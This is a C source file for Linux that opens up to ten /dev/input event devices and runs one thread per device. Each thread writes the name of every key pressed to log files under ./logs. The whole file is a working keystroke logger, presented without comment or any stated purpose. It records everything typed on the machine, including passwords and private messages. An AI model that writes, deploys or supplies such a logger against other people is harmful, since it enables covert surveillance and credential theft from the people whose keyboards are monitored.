#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <string.h>
#include <errno.h>
#include <dirent.h>
#include <sys/select.h>
#include <pthread.h>
#include <sys/stat.h>

#define EVENT_PATH "/dev/input/"
#define MAX_DEVICES 10

const char *key_names[256] = {
    "UNKNOWN", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", 
    "MINUS", "EQUAL", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", "U", 
    "I", "O", "P", "LEFTBRACE", "RIGHTBRACE", "ENTER", "LEFTCTRL", "A", "S", 
    "D", "F", "G", "H", "J", "K", "L", "SEMICOLON", "APOSTROPHE", "GRAVE", 
    "LEFTSHIFT", "BACKSLASH", "Z", "X", "C", "V", "B", "N", "M", "COMMA", 
    "DOT", "SLASH", "RIGHTSHIFT", "KPASTERISK", "LEFTALT", "SPACE", "CAPSLOCK", 
    "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUMLOCK", 
    "SCROLLLOCK", "KP7", "KP8", "KP9", "KPMINUS", "KP4", "KP5", "KP6", "KPPLUS", 
    "KP1", "KP2", "KP3", "KP0", "KPDOT", "ZENKAKUHANKAKU", "102ND", "F11", 
    "F12", "RO", "KATAKANA", "HIRAGANA", "HENKAN", "KATAKANAHIRAGANA", "MUHENKAN", 
    "KPJPCOMMA", "KPENTER", "RIGHTCTRL", "KPSLASH", "SYSRQ", "RIGHTALT", 
    "HOME", "UP", "PAGEUP", "LEFT", "RIGHT", "END", "DOWN", "PAGEDOWN", 
    "INSERT", "DELETE", "MUTE", "VOLUMEDOWN", "VOLUMEUP", "POWER", "KPEQUAL", 
    "PAUSE", "KPCOMMA", "HANGUEL", "HANJA", "YEN", "LEFTMETA", "RIGHTMETA", 
    "COMPOSE", "STOP", "AGAIN", "PROPS", "UNDO", "FRONT", "COPY", "OPEN", "PASTE", 
    "FIND", "CUT", "HELP", "CALC", "SLEEP", "WWW", "SCREENLOCK", "BACK", "FORWARD", 
    "EJECTCD", "NEXTSONG", "PLAYPAUSE", "PREVIOUSSONG", "STOPCD", "REFRESH", 
    "EDIT", "SCROLLUP", "SCROLLDOWN", "KPLEFTPAREN", "KPRIGHTPAREN", "F13", "F14", 
    "F15", "F16", "F17", "F18", "F19", "F20", "F21", "F22", "F23", "F24", "UNKNOWN"
};

#define NUM_DEVICES 10

typedef struct
{
    int fd;
    int device_number;
} device_info_t;

void *monitor_device(void *arg)
{
    device_info_t *dev_info = (device_info_t *)arg;
    int fd = dev_info->fd;
    int device_number = dev_info->device_number;
    struct input_event ev;
    fd_set read_fds;
    struct timeval timeout;
    struct stat st = {0};
    if (stat("./logs", &st) == -1)
    {
        if (mkdir("./logs", 0755) == -1)
        {
            perror("Error creating logs directory");
            return NULL;
        }
    }

    while (1)
    {
        FD_ZERO(&read_fds);
        FD_SET(fd, &read_fds);
        timeout.tv_sec = 0;
        timeout.tv_usec = 100000;

        int ready = select(fd + 1, &read_fds, NULL, NULL, &timeout);
        if (ready == -1)
        {
            perror("select error");
            break;
        }

        if (FD_ISSET(fd, &read_fds))
        {
            if (read(fd, &ev, sizeof(struct input_event)) == -1)
            {
                perror("Error reading event");
                continue;
            }

            if (ev.type == EV_KEY && key_names[ev.code])
            {
                char log_filename[256];
                snprintf(log_filename, sizeof(log_filename), "./logs/event%d.log", device_number);
                int log_fd = open(log_filename, O_WRONLY | O_APPEND | O_CREAT, 0644);
                if (log_fd != -1)
                {
                    if (ev.value == 1)
                    {
                        write(log_fd, key_names[ev.code], strlen(key_names[ev.code]));
                        write(log_fd, " ", 1);
                    }
                    close(log_fd);
                }
                else
                {
                    perror("Error opening log file");
                }
            }
        }
    }
    close(fd);
    return NULL;
}

void monitor_keyboards()
{
    struct dirent *entry;
    DIR *dp = opendir(EVENT_PATH);
    if (dp == NULL)
    {
        perror("Error opening directory");
        return;
    }

    int devices[NUM_DEVICES];
    int num_devices = 0;
    pthread_t threads[NUM_DEVICES];

    while ((entry = readdir(dp)) && num_devices < NUM_DEVICES)
    {
        if (strncmp(entry->d_name, "event", 5) != 0)
            continue;

        char device_path[256];
        snprintf(device_path, sizeof(device_path), "%s%s", EVENT_PATH, entry->d_name);
        int fd = open(device_path, O_RDONLY);
        if (fd == -1)
        {
            continue;
        }

        devices[num_devices++] = fd;
        device_info_t *dev_info = malloc(sizeof(device_info_t));
        dev_info->fd = fd;
        dev_info->device_number = num_devices - 1;
        pthread_create(&threads[num_devices - 1], NULL, monitor_device, dev_info);
    }

    closedir(dp);
    for (int i = 0; i < num_devices; i++)
    {
        pthread_join(threads[i], NULL);
    }
}

int main()
{
    monitor_keyboards();
    return 0;
}
